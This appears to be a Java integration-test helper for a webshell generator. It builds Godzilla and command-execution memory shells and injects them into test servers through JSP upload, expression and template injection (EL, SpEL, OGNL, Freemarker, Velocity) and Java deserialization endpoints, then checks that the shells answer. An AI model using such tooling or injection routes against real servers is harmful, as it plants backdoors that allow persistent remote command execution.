package com.reajason.javaweb.integration;

import com.reajason.javaweb.GeneratorMain;
import com.reajason.javaweb.config.*;
import com.reajason.javaweb.memsell.packer.Packer;
import lombok.extern.slf4j.Slf4j;

import java.util.Base64;

/**
 * @author ReaJason
 * @since 2024/12/5
 */
@Slf4j
public class ShellAssertionTool {
    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packer.INSTANCE packer) {
        String shellUrl = url + "/test";

        InjectorConfig injectorConfig = new InjectorConfig();
        if (shellType.endsWith(Constants.SERVLET)) {
            String urlPattern = "/" + shellTool + shellType + packer.name();
            shellUrl = url + urlPattern;
            injectorConfig.setUrlPattern(urlPattern);
        }

        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .shellTool(shellTool)
                .shellType(shellType)
                .targetJreVersion(targetJdkVersion)
                .debug(true)
                .build();


        switch (shellTool) {
            case Godzilla:
                String pass = "pass";
                String key = "key";
                String headerValue = "Godzilla" + shellType + packer.name();
                GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                        .pass(pass).key(key)
                        .headerName("User-Agent").headerValue(headerValue)
                        .build();
                log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, pass, key, headerValue);
                String content = GeneratorMain.generate(shellConfig, injectorConfig, godzillaConfig, packer);
                assertInjectIsOk(url, shellType, shellTool, content, packer);
                GodzillaShellTool.testIsOk(shellUrl, godzillaConfig);
                break;
            case Command:
                String paramName = "Command" + shellType + packer.name();
                CommandConfig commandConfig = CommandConfig.builder().paramName(paramName).build();
                String commandContent = GeneratorMain.generate(shellConfig, injectorConfig, commandConfig, packer);
                log.info("generated {} command shell with paramName: {}", shellType, commandConfig.getParamName());
                assertInjectIsOk(url, shellType, shellTool, commandContent, packer);
                CommandShellTool.testIsOk(shellUrl, commandConfig);
        }
    }

    public static void assertInjectIsOk(String url, String shellType, ShellTool shellTool, String content, Packer.INSTANCE packer) {
        log.info(content);
        switch (packer) {
            case JSP -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + ".jsp";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case ScriptEngine -> VulTool.postData(url + "/js", content);
            case EL -> VulTool.postData(url + "/el", content);
            case SpEL -> VulTool.postData(url + "/spel", content);
            case OGNL -> VulTool.postData(url + "/ognl", content);
            case Freemarker -> VulTool.postData(url + "/freemarker", content);
            case Velocity -> VulTool.postData(url + "/velocity", content);
            case Deserialize ->
                    VulTool.postData(url + "/java_deserialize", content);
        }
    }
}
